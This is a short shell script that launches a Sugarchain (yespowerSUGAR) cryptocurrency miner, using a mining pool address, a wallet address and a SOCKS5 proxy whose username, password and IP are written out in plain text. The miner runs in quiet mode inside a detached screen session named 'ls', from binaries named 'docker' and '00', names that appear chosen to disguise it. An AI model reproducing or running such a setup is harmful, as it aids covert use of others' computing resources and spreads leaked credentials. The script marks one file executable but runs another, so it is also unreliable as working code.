sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=1pool.sugarchain.org:3333
WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.adz
PROXY=socks5://woiden_aqsha2:aing1234@163.172.214.196:8080
./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
